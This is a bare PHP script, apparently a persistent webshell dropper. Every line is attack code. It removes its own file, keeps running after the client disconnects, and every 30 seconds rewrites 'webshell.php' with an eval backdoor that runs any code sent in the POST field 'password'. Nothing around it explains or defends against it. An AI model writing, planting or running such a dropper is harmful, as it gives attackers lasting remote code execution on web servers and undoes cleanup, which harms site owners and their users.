<?php  
    set_time_limit(0);  
    ignore_user_abort(1);  
    unlink(__FILE__);  
    while(1){  
        file_put_contents('webshell.php','<?php @eval($_POST["password"]);?>');  
        sleep(30);  
    }
?>